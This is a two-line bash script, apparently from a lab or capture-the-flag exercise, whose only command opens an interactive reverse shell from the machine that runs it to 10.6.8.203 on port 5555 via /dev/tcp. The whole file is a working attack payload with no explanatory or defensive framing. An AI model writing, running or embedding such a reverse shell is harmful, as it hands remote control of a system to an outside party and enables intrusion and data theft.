#!/bin/bash
bash -c 'exec bash -i &>/dev/tcp/10.6.8.203/5555 <&1'
